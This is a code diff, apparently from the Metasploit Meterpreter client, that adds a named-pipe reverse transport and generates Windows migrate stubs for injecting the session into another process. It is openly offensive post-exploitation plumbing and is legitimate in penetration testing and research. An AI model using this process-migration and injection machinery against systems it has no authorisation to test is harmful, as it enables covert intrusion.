@@ -7,6 +7,8 @@ require 'rex/post/meterpreter/client'
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
 require 'msf/core/payload/windows'
+require 'msf/core/payload/windows/migrate'
+require 'msf/core/payload/windows/x64/migrate'
 
 # URI uuid and checksum stuff
 require 'msf/core/payload/uuid'
@@ -35,6 +37,7 @@ class ClientCore < Extension
   METERPRETER_TRANSPORT_SSL   = 0
   METERPRETER_TRANSPORT_HTTP  = 1
   METERPRETER_TRANSPORT_HTTPS = 2
+  METERPRETER_TRANSPORT_PIPE  = 3
 
   TIMEOUT_SESSION = 24*3600*7  # 1 week
   TIMEOUT_COMMS = 300          # 5 minutes
@@ -42,10 +45,11 @@ class ClientCore < Extension
   TIMEOUT_RETRY_WAIT = 10      # 10 seconds
 
   VALID_TRANSPORTS = {
-    'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
-    'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
-    'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
-    'bind_tcp'      => METERPRETER_TRANSPORT_SSL
+    'reverse_tcp'        => METERPRETER_TRANSPORT_SSL,
+    'reverse_http'       => METERPRETER_TRANSPORT_HTTP,
+    'reverse_https'      => METERPRETER_TRANSPORT_HTTPS,
+    'reverse_named_pipe' => METERPRETER_TRANSPORT_PIPE,
+    'bind_tcp'           => METERPRETER_TRANSPORT_SSL
   }
 
   include Rex::Payloads::Meterpreter::UriChecksum
@@ -121,6 +125,10 @@ class ClientCore < Extension
     }
 
     result
+  end
+
+  def get_transport_current
+    transport_list[:transports][0]
   end
 
   def set_transport_timeouts(opts={})
@@ -481,7 +489,8 @@ class ClientCore < Extension
       # Rex::Post::FileStat#writable? isn't available
     end
 
-    blob = generate_payload_stub(process)
+    migrate_stub = generate_migrate_stub(process)
+    migrate_payload = generate_payload_stub(process)
 
     # Build the migration request
     request = Packet.create_request('core_migrate')
@@ -493,23 +502,25 @@ class ClientCore < Extension
         raise RuntimeError, 'The writable dir is too long', caller
       end
 
-      pos = blob.index(DEFAULT_SOCK_PATH)
+      pos = migrate_payload.index(DEFAULT_SOCK_PATH)
 
       if pos.nil?
         raise RuntimeError, 'The meterpreter binary is wrong', caller
       end
 
-      blob[pos, socket_path.length + 1] = socket_path + "\x00"
+      migrate_payload[pos, socket_path.length + 1] = socket_path + "\x00"
 
-      ep = elf_ep(blob)
+      ep = elf_ep(migrate_payload)
       request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
       request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
       request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
     request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub)
 
     if process['arch'] == ARCH_X86_64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
@@ -631,6 +642,10 @@ class ClientCore < Extension
     end
 
     if opts[:transport].starts_with?('reverse')
+      if opts[:transport].ends_with?('pipe') && !opts[:lhost]
+        opts[:lhost] = '.'
+      end
+
       return false unless opts[:lhost]
     else
       # Bind shouldn't have lhost set
@@ -641,8 +656,9 @@ class ClientCore < Extension
 
     request = Packet.create_request(method)
 
-    scheme = opts[:transport].split('_')[1]
-    url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"
+    scheme = opts[:transport].split('_')[-1]
+    url = "#{scheme}://#{opts[:lhost]}"
+    url << ":#{opts[:lport]}" if opts[:lport]
 
     if opts[:luri] && opts[:luri].length > 0
       if opts[:luri][0] != '/'
@@ -671,7 +687,7 @@ class ClientCore < Extension
     end
 
     # do more magic work for http(s) payloads
-    unless opts[:transport].ends_with?('tcp')
+    if opts[:transport] =~ /https?/
       if opts[:uri]
         url << '/' unless opts[:uri].start_with?('/')
         url << opts[:uri]
@@ -709,9 +725,48 @@ class ClientCore < Extension
     request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
     request.add_tlv(TLV_TYPE_TRANS_URL, url)
 
-    return request
+    request
   end
 
+  def generate_migrate_stub(process)
+    stub = nil
+    case client.platform
+    when /win/i
+      t = get_transport_current
+
+      c = Class.new(::Msf::Payload)
+
+      if process['arch'] == ARCH_X86
+        c.include(::Msf::Payload::Windows::BlockApi)
+
+        case t[:url]
+        when /^tcp/
+          c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^http/
+          # covers both HTTP and HTTPS
+          c.include(::Msf::Payload::Windows::MigrateHttp)
+        when /^pipe/
+          c.include(::Msf::Payload::Windows::MigratePipe)
+        end
+      else
+        c.include(::Msf::Payload::Windows::BlockApi_x64)
+
+        case t[:url]
+        when /^tcp/
+          c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^http/
+          # covers both HTTP and HTTPS
+          c.include(::Msf::Payload::Windows::MigrateHttp_x64)
+        when /^pipe/
+          c.include(::Msf::Payload::Windows::MigratePipe_x64)
+        end
+      end
+      stub = c.new().generate
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
+    end
+    stub
+  end
 
   def generate_payload_stub(process)
     case client.platform
@@ -742,9 +797,7 @@ class ClientCore < Extension
     # Create the migrate stager
     migrate_stager = c.new()
 
-    blob = migrate_stager.stage_meterpreter
-
-    blob
+    migrate_stager.stage_meterpreter
   end
 
   def generate_linux_stub
